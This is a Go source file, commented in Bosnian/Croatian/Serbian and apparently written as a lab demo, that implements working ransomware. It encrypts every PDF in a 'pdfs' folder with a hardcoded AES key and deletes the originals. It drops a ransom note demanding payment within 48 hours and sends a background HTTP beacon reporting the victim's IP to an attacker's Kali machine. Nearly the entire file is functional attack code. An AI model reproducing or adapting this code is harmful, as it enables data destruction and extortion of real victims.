package main

import (
    "crypto/aes"
    "crypto/cipher"
    "crypto/rand"
    "fmt"
    "io"
    "net/http"
    "os"
    "path/filepath"
    "strings"
)

const aes_key = "12345678123456781234567812345678"
const kali_ip = "10.0.2.15" // OVDJE STAVITE IP ADRESU VASEG KALIJA

// Funkcija za obavještavanje napadača (Kali Linux)
func notifyAttacker(victimIP string) {
    url := fmt.Sprintf("http://%s:8080/infected?ip=%s", kali_ip, victimIP)
    // Šaljemo zahtjev u pozadini, ne blokiramo rad programa
    go http.Get(url)
}

// Funkcija za kreiranje ransom poruke
func dropRansomNote(dirPath string) {
    noteContent := `
=============================================
VASI FAJLOVI SU ENKRIPTOVANI!
Svi vasi PDF dokumenti su sada nečitljivi.

Da biste povratili pristup, morate platiti otkupninu.
Kontaktirajte nas na: zli.haker@darkweb.onion

Ukoliko ne platite u roku od 48h, vaši podaci
će biti trajno izgubljeni.
=============================================
`
    notePath := filepath.Join(dirPath, "RANSOM_NOTE.txt")
    err := os.WriteFile(notePath, []byte(noteContent), 0644)
    if err != nil {
        fmt.Println("Greska pri kreiranju ransom poruke: ", err)
    } else {
        fmt.Println("Ransom poruka uspjesno kreirana.")
    }
}

func main() {
    path := "pdfs"
    victimIP := "192.168.1.50" // Možete hardkodirati neku IP adresu žrtve radi demoa

    // Obavještavamo Kali da je napad počeo
    notifyAttacker(victimIP)

    encryptionCount := 0

    err := filepath.Walk(path, func(path string, info os.FileInfo, err error) error {
        if err != nil {
            fmt.Println("Error accesing path: ", path, err)
            return err
        }
        if !info.IsDir() && strings.HasSuffix(info.Name(), ".pdf") {
            data, err := os.ReadFile(path)
            if err != nil {
                fmt.Println("Error reading file: ", path, err)
                return err
            }

            file, err := os.Create(path + ".enc")
            if err != nil {
                fmt.Println(err)
                return err
            }
            defer file.Close()

            aes_key_byted := []byte(aes_key)
            aes_key_cipher, _ := aes.NewCipher(aes_key_byted)
            gcm, err := cipher.NewGCM(aes_key_cipher)
            if err != nil {
                fmt.Println("Greska pri GCM")
                return err
            }
            nonce := make([]byte, gcm.NonceSize())
            _, err = io.ReadFull(rand.Reader, nonce)

            encrypted_data := gcm.Seal(nonce, nonce, data, nil)
            _, err = file.Write(encrypted_data)
            if err != nil {
                fmt.Println("Greska pri pisanju")
                return err
            }
            err = os.Remove(path)
            if err != nil {
                fmt.Println("Greska pri brisanju originala")
                return err
            }
            
            encryptionCount++
            fmt.Printf("Enkriptovan: %s\n", info.Name())
        }

        return err
    })

    if err != nil {
        fmt.Println("Error walking through the files/folders", err)
        return
    }

    // Nakon što prođe kroz sve fajlove, ostavi poruku u folderu 'pdfs'
    if encryptionCount > 0 {
        dropRansomNote("pdfs")
        fmt.Println("Enkripcija zavrsena. Sistemi zarazeni.")
    } else {
        fmt.Println("Nije pronadjen nijedan PDF za enkripciju.")
    }
}